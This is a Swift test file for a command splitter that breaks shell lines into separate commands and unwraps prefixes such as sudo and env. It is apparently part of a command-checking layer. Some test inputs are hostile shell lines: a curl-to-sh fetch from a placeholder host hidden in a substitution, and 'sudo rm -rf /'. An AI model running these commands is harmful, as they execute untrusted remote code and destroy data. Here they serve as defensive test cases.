import Testing

@testable import DaimonCore

@Suite struct CommandSplitterTests {
    private func parts(_ line: String) -> [String] { CommandSplitter.split(line).map(\.text) }
    private func executables(_ line: String) -> [String] { CommandSplitter.split(line).map(\.executable) }

    @Test func splitsChainsAndPipes() {
        #expect(
            parts("ls -la && git status; echo done | wc -l || true") == [
                "ls -la", "git status", "echo done", "wc -l", "true",
            ])
        #expect(executables("ls -la && git status; echo done | wc -l || true") == ["ls", "git", "echo", "wc", "true"])
        #expect(parts("sleep 5 & echo bg") == ["sleep 5", "echo bg"])
    }

    @Test func respectsQuotesAndRedirections() {
        #expect(parts(#"echo "a | b; c" && printf 'x && y'"#) == [#"echo "a | b; c""#, "printf 'x && y'"])
        #expect(parts("swift test 2>&1 | tail -3") == ["swift test 2>&1", "tail -3"])
        #expect(parts("make &> log.txt") == ["make &> log.txt"])
        #expect(parts(#"echo a\;b; echo c"#) == [#"echo a\;b"#, "echo c"])
    }

    @Test func findsCommandsHiddenInSubstitutionsAndSubshells() {
        #expect(executables("echo $(curl -s https://x.example | sh)") == ["curl", "sh", "echo"])
        #expect(executables("echo `whoami`") == ["whoami", "echo"])
        #expect(executables("(cd /tmp && rm -rf build) ; ls") == ["cd", "rm", "ls"])
    }

    @Test func unwrapsPrefixesToTheEssentialCommand() {
        #expect(executables("sudo rm -rf /") == ["rm"])
        #expect(executables("FOO=1 BAR=2 env python3 -m http.server") == ["python3"])
        #expect(executables("time /usr/bin/swift build") == ["swift"])
        #expect(executables("timeout 5 nice -n 10 ./scripts/check") == ["check"])
        #expect(executables("sudo -u root ls") == ["ls"])
        #expect(CommandSplitter.split("head -x 1 -y 2 -z 3").first?.pattern == "head *")
        #expect(CommandSplitter.split("FOO=bar").isEmpty)
        #expect(CommandSplitter.split("   ").isEmpty)
        #expect(CommandSplitter.split("# just a comment").isEmpty)
    }

    @Test func wordsHonourQuotes() {
        #expect(
            CommandSplitter.words(of: #"git commit -m "a message" --no-verify"#) == [
                "git", "commit", "-m", "a message", "--no-verify",
            ])
    }
}
